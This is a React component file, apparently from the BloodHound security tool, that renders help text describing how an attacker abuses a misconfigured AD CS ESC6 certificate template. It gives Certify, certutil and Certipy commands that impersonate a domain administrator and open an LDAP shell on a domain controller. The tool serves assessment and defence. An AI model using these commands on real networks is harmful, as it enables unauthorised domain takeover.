// Copyright 2024 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Box, Typography } from '@mui/material';

const WindowsAbuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>An attacker may perform this attack in the following steps:</Typography>
            <Typography variant='body2'>
                <Box component='span' sx={{ fontWeight: 'bold' }}>
                    Step 1:
                </Box>{' '}
                Use Certify to request enrollment int he affected template, specifying the affected certification
                authority and target principal to impersonate:
            </Typography>
            <Typography component={'pre'}>
                {
                    '.\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:forestroot\\ForestRootDA'
                }
            </Typography>
            <Typography variant='body2'>
                <Box component='span' sx={{ fontWeight: 'bold' }}>
                    Step 2:
                </Box>{' '}
                Convert the emitted certificate to PFX format:
            </Typography>
            <Typography component={'pre'}>{'certutil.exe -MergePFX .\\cert.pem .\\cert.pfx'}</Typography>
            <Typography variant='body2'>
                <Box component='span' sx={{ fontWeight: 'bold' }}>
                    Step 3:
                </Box>{' '}
                Use Certipy to connect to the domain controller via Schannel, specifying the PFX-formatted certificate
                created in Step 2:
            </Typography>
            <Typography component={'pre'}>{'certipy auth -pfx .\\cert.pfx -dc-ip 10.4.0.4 -ldap-shell'}</Typography>
        </>
    );
};

export default WindowsAbuse;
